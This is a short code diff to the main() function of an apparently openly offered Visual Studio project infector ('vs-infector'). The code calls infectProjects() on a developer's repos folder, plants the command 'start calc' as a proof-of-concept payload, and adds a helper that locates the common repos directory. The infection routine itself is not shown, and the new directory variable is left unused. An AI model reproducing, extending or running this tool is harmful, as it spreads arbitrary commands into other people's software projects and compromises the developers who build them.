@@ -2,11 +2,13 @@
 #include <iostream>
 #include <Windows.h>
 
+//source code - https://github.com/dwx911/vs-infector
 
 int main() {
 	
-	// your path should be the root to your projects eg. C:\\Users\\dwx\\source\\repos
-	infectProjects(L"C:\\Users\\dwx\\source\\repos", L"start calc");
+	std::wstring repoDir = getCommonRepoDir(); //this is the common directory most people have for repos
+
+	infectProjects(L"C:\\Users\\dwx\\source\\repos", L"start calc"); // or use a custom directory like this
 	std::wcin.get(); // keeps the console from closing automatically
 
 	return 0;
